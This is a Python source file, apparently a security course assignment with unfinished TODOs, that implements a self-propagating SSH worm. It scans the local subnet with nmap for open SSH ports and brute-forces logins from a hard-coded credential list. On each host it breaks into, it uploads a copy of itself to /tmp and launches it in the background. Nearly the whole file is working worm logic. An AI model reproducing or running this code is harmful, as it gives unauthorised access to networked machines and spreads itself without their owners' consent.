import paramiko
import sys
import socket
import nmap
import netinfo
import os
import netifaces

# The list of credentials to attempt
credList = [
	('hello', 'world'),
	('hello1', 'world'),
	('root', '#Gig#'),
	('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = '/tmp/infected.txt'

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	return os.path.exists(INFECTED_MARKER_FILE)
	#pass

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	inf = open(INFECTED_MARKER_FILE, 'x')
	inf.write('yes')
	#pass	

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	sftpClient = sshClient.open_sftp()
	sftpClient.put("worm.py", "/tmp/worm.py")
	sshClient.exec_command("chmod a+x /tmp/worm.py")
	sshClient.exec_command("nohup python /tmp/worm.py &")
	pass


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	try:
		sshClient.connect(host, userName, password)
	except paramiko.SSHException:
		return 1
	except socket.error:
		return 3
	
	return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		if tryCredentials(host, username, password, ssh) == 0:
			return (ssh, username, password)
			
	# Could not find working credentials
	return None

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	faces = netifaces.interfaces()
	IP = None

	for face in faces:
		address = netifaces.ifaddresses(face)[2][0]['addr']

		if not address == "127.0.0.1":
			IP = address
			break

	return IP

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	port_scanner = nmap.PortScanner()
	port_scanner.scan('192.168.1.0/24', arguments='-p -22 --open')
	host_info = port_scanner.all_hosts();
	host_list = []
	IP = getMyIP(b"eth0")

	for host in host_info:
		if port_scanner[host].state() == "up" and host != IP:
			host_list.append(host)

	return host_list

#######################################################
# Clean by removing the marker and copied worm program
# @param sshClient - the instance of the SSH client 
# connected to the victim system
#######################################################
def cleaner(sshClient): 
	os.remove(INFECTED_MARKER_FILE)
	os.remove("/tmp/worm.py")
	pass

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously.
if len(sys.argv) < 2:
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	pass
# TODO: Get the IP of the current system


# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).

print("Found hosts: ", networkHosts)


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	print(sshInfo)
	
	
	# Did the attack succeed?
	if sshInfo:
		
		print("Trying to spread")
		spreadAndExecute(sshInfo[0])
		
		print("Spreading complete")	
	

